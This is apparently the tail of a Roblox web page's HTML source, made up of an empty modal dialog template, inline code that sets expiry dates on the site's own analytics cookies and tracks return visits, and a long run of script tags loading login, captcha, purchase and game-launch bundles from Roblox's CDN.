		<div id="modal-dialog" class="modal-dialog">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button>
					<h5 class="modal-title"></h5> </div>
				<div class="modal-body">
					<div class="modal-top-body">
						<div class="modal-message"></div>
						<div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click=""> <img class="modal-thumb" alt="generic image"> </div>
						<div class="modal-checkbox checkbox">
							<input id="modal-checkbox-input" type="checkbox">
							<label for="modal-checkbox-input"></label>
						</div>
					</div>
					<div class="modal-btns"> <a href="" id="confirm-btn"><span></span></a> <a href="" id="decline-btn"><span></span></a> </div>
					<div class="loading modal-processing"> <img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing..."> </div>
				</div>
				<div class="modal-footer text-footer"> </div>
			</div>
		</div>
	</div>
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.jsConsoleEnabled = false;
	</script>
	<script type="text/javascript">
	$(function() {
		Roblox.CookieUpgrader.domain = 'roblox.com';
		Roblox.CookieUpgrader.upgrade("GuestData", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXSource", {
			expires: function(cookie) {
				return Roblox.CookieUpgrader.getExpirationFromCookieValue("rbx_acquisition_time", cookie);
			}
		});
		Roblox.CookieUpgrader.upgrade("RBXViralAcquisition", {
			expires: function(cookie) {
				return Roblox.CookieUpgrader.getExpirationFromCookieValue("time", cookie);
			}
		});
		Roblox.CookieUpgrader.upgrade("RBXMarketing", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXSessionTracker", {
			expires: Roblox.CookieUpgrader.fourHoursFromNow
		});
		Roblox.CookieUpgrader.upgrade("RBXEventTrackerV2", {
			expires: Roblox.CookieUpgrader.thirtyYearsFromNow
		});
	});
	</script>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="intl-polyfill" type="text/javascript" src="https://js.rbxcdn.com/d44520f7da5ec476cfb1704d91bab327.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalCore" data-bundle-source="Main" src="https://js.rbxcdn.com/95044be3ff42e3dc429313faca1316cea62f328a39e29689ffeda9002f3a8bc6.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="TranslationResources" data-bundle-source="Main" src="https://js.rbxcdn.com/83d836a661ff433d5b7ce719c489e43af590ff75ab39ccc6d393546fe91b766a.js"></script>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="https://js.rbxcdn.com/19c8160ae932a35d164b48dd597c55c2.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/3c84a31c3546577e47417d37f78dbbf044ba1d31fc4386e48673b9fc319c1851.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/76a4480b37d00df868cd2f72f045e279ab6525b49284e5486c28fd2c3fb8f562.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="React" data-bundle-source="Main" src="https://js.rbxcdn.com/b79589d3dfb2446936aac95605deaa507ce5bc3e09073bac7dd04872880694c2.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactStyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/0346acf635cbe0dc3b71af9a6be331830c5b9a2505bebc4dba6299d1f463de61.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ConfigureWebApps" data-bundle-source="Main" src="https://js.rbxcdn.com/5259cfe8a3e36118bd61120693dbba3ba87f2c3641f84bb07e29f1d69fe87523.js"></script>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="angular" type="text/javascript" src="https://js.rbxcdn.com/ae3d621886e736e52c97008e085fa286.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/920fa8d7ee325f1b215a11d7f3729d3df89fe6164ba99818ff26b3346f6c058d.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" data-bundle-source="Main" src="https://js.rbxcdn.com/90f18784a43a70553e967191b948f70b0193df565f1605762c3c1e245ab4b55a.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" data-bundle-source="Main" src="https://js.rbxcdn.com/d5ea02ab1f95cb8aefa0a3f4cd0151b4220841fc448c2072d3481d95017db6ab.js"></script>
	<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="PresenceRegistration" data-bundle-source="Main" src="https://js.rbxcdn.com/0a83202cf5f2310227e607928f73a26cdaa7d5c27f892b99ef51ec3b863a694d.js"></script>
	<div ng-modules="baseTemplateApp" class="ng-scope">
		<script type="text/javascript" src="https://js.rbxcdn.com/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
	</div>
	<div ng-modules="pageTemplateApp" class="ng-scope">
		<script type="text/javascript" src="https://js.rbxcdn.com/3e544c8e724dcdc296258b0ca69401a9.js"></script>
	</div>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="VerificationUpsell" data-bundle-source="Main" src="https://js.rbxcdn.com/87be9b33b353d0fa361a325fbad80432b5d03852378038172f843449acdb5334.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/13e5aebdae824009539fe2c02d26b760a073715785511060e8164dae78594b23.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1da31fa41317a697c5845455d2a001650f36f202d352317e5ddc1613a262ef35.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Experimentation" data-bundle-source="Main" src="https://js.rbxcdn.com/c4b0a446b38285f3db5472340f4ef27d737c87b78348e36dc7acbcfec89d70bf.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Navigation" data-bundle-source="Main" src="https://js.rbxcdn.com/ffaf76855ebd315a987ae18466968891ab2f2967764341564ee0b43acb3b52a5.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/57d1b7776de993a3bf8ace38e6efd8f8ce5b9a294362c029990f0cf131548531.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/385a62cb16e1c8524da81c17728733d79e3ad9ccbc342d982fe79352f8785dba.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c0606e8d6eb4487cdc70d318e6de3d9aaeeb465ddb84acd95139011e56c5e5c6.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/95fdafe5af749e388de603b9ee7f67bb092c3c790badc572db4e2bca0c32b49a.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c629f6739d6903fec0d935d26a9cea02ff757856d4ed73a83fd1535affea0300.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5370e5e55fc9993ec53b0a4195e82290b8c1c5f95a1fb5cd11a2ec82d5d07809.js"></script>
	<script type="text/javascript">
	Roblox.config.externalResources = [];
	Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';
	Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/33126cd3e259a404a2563594f55a3f06.js';
	Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';
	Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';
	Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';
	Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';
	Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';
	</script>
	<script>
	$(function() {
		Roblox.DeveloperConsoleWarning.showWarning();
	});
	</script>
	<script type="text/javascript">
	$(function() {
		function trackReturns() {
			function dayDiff(d1, d2) {
				return Math.floor((d1 - d2) / 86400000);
			}
			if(!localStorage) {
				return false;
			}
			var cookieName = 'RBXReturn';
			var cookieOptions = {
				expires: 9001
			};
			var cookieStr = localStorage.getItem(cookieName) || "";
			var cookie = {};
			try {
				cookie = JSON.parse(cookieStr);
			} catch(ex) {
				// busted cookie string from old previous version of the code
			}
			try {
				if(typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
					localStorage.setItem(cookieName, JSON.stringify({
						ts: new Date().toDateString()
					}));
					return false;
				}
			} catch(ex) {
				return false;
			}
			var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
			if(daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
				RobloxEventManager.triggerEvent('rbx_evt_odr', {});
				cookie.odr = 1;
			}
			if(daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
				RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
				cookie.sdr = 1;
			}
			try {
				localStorage.setItem(cookieName, JSON.stringify(cookie));
			} catch(ex) {
				return false;
			}
		}
		GoogleListener.init();
		RobloxEventManager.initialize(true);
		RobloxEventManager.triggerEvent('rbx_evt_pageview');
		trackReturns();
		RobloxEventManager._idleInterval = 450000;
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
		RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
	});
	</script>
	<script type="text/javascript">
	var Roblox = Roblox || {};
	Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};
	Roblox.UpsellAdModal.Resources = {
		title: "Remove Ads Like This",
		body: "Builders Club members do not see external ads like these.",
		accept: "Upgrade Now",
		decline: "No, thanks"
	};
	</script>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="page" type="text/javascript" src="https://js.rbxcdn.com/03772e70e19bd2996b90e1e296a0a8d4.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="StyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/2f07889e8f290c066b3309491942ced128803f3697b5ed2f5e6149db2fcd375d.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CookieBannerV3" data-bundle-source="Main" src="https://js.rbxcdn.com/7693d98990f875a88c91c0385e1b0542bb51913fb34b23f414b6890d90353c40.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/18dede93de3aac02225e1e6e9957d98d6983c39fc9e76eb0cdb05090e5551f95.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5b148ca445e1fd4ef905bc3665b2e29d065ab357cc88fd68be95b519f6e2da0d.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/ce6a4105a4d28cac59aa57a3d6615d56ba63526569ebfd88d49ac363d61caddb.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fb47e86d6d7deaf62c7c5c8a62d915361b3f9b47503976e24e4fdd44710a492e.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Footer" data-bundle-source="Main" src="https://js.rbxcdn.com/bffafd994791f59d1efb67723313fc0f59b58fef8dec7cf83535c8f4d1d1ebd9.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Captcha" data-bundle-source="Main" src="https://js.rbxcdn.com/b4fc87cb4363aebafcd2034f72fb9e07022e0f13accb3ae8d9da81dc9eb15859.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CaptchaCore" data-bundle-source="Main" src="https://js.rbxcdn.com/d4cb3f0769ad2c961ffef6d480f99f8ab4ecdac3ce6a8cd094dad5878d906d15.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Challenge" data-bundle-source="Main" src="https://js.rbxcdn.com/86449886ae9494a04b4ad9af3f39843435e92310d0d73d813960110f3ecf4759.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5a67818cb9f234cc3d70d2c853e74c7f2a05a90510ed8a21fcf33e3d836faa45.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8caf2b65ee828e800e5876d0e115b50feeea54bd99c5c0a1be51369a03bb8e88.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3574cff8a3839614386f61fdf914e02e5217a7878601ce33a9ff41f94a2ad8e3.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a054aec7da3a2b719cf38e09c5f6a9f45af54f6e632aa964ccc8b5ec2d83b9b0.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6a01cbf296d3e8aa5fefa3dc991cac628716cceded614fb84cbadfd78f507d85.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0f46a1db16bff49a6b3dbb2c17a6723366faf5a93870711a8f92fb9058a1776c.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1057677ca91f349db02f7b279cdfbf25bec8098a13c7870317f7ad4cd4779a97.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3241cdd45931acc3efce4b49df4fe9583ed09d79994cc782364a84c4e851af5c.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4963a609b0bb2465ffa6a7ad10bcff85662879d2f342f0cb1a2485320dd81eb5.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c239c2a4cca7b50a6b45a6c32ee7ddfaa0bba7011c733c6db5aad0f6a7927d54.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" src="https://js.rbxcdn.com/fad5c0064cbdb1d4c125246ddde8d290eaffef2d3dda9eb3bad041acc2649f95.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8e93ba688bf081b524dc54a945cb3f0307d65a2ede01928ae6d0fa6d3b676a94.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5e974d9ade65c974276bb33dc40e342849e25d669c164fa154a0ed2c22e926aa.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/cf8007c7bce4435c31ba6aaaa41b27285e3a2e3c2bca7c2fdbb03da982e32a76.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/80ebdc7734ff5f0d4f9def8f7ebb22ee6c85d8962c905b42ab37dc2f29e2d056.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fe345fa49171e73999c333520b87bb3051dbd4c4e74c2ca9ebf8a8c05110f96a.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a6621e0d27855e4e2afe111af5aff2146ad81993b241f77c3188671c2704b7db.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" src="https://js.rbxcdn.com/0cb8d2d6f4d1670adfee3b204fcb3a2dbf61819b82895f8257f0e5055d2c5b2b.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="https://js.rbxcdn.com/86b7462506fcd8b4766868f3db06469c18bd70adb9793695bfbb3ef2cf48f4fd.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="https://js.rbxcdn.com/e067b89cb37bc993adf99c89d8200fe9dbf7363de77dd657d04a48923c32501c.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1e9c21f67e9901f767acd1db03c4a5c6029d4bc0862424e80c746d6e3cf5b99c.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5c44d71f75449192684a6558fdffae735d08a0a29e18c656dc0374df397a0050.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ItemPurchase" data-bundle-source="Main" src="https://js.rbxcdn.com/5804331763d8dd8d8fb671924b73023bd1feddd205229569f18413e6f0190f93.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9cf047a292f5735b2ce9c1896e1951a873acc17e0d794deddde210b8bd91d6d4.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0eb9f3bc4309642fdf241b8263d8987cbe07add49b9342084cdc23be4e042d93.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/7918ac8b721b946f2800652b084166ae795408706e447c98a9af8ca3e8a0cbc0.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4e1037868737fa797b0e3248bc05479c925d8029ec146d6633aeebd9e0bb6c71.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/97b99d5ea1fd09bf3fa4aed595502676b5c6d366675698913916b7b0f1b33a30.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8f8d451cbe04b730d167b5ce92019da934a5c2da928ca13d9b3eb15cbe2ff5d5.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="IdVerification" data-bundle-source="Main" src="https://js.rbxcdn.com/6fb6e995f12e838d8f66c5e1ab8a5b60557dc6e1cd355ecbcff835358590ab90.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f63323dbe986f27298530ab64116f8970ac99e475c204875739756cfe6dc2b3c.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/943872911690cace707b2409baaef7feae5161c4e92ec90174e09165b46c60f5.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameLaunch" data-bundle-source="Main" src="https://js.rbxcdn.com/c8a5a277ce6a0cbc4f7b673d7d59e93c63a62a2d86e68d32eac55af32a553945.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f5964480d72a66fed298d36e9ad7c0a033020f0f488a49773b129905e4390e60.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/d720f5c5c32eb353fd76c5a101f47e529363a19bf44c18b01b501e0c648c81b4.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f41ec06eeae79fa94e6ae9f435b0a1c6743085e898884eddb4d4025ca3af8a44.js"></script>
	<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6852af8f7df15395ccb3d121a914ee7301a7162f5afb3395575c6075c617923f.js"></script>
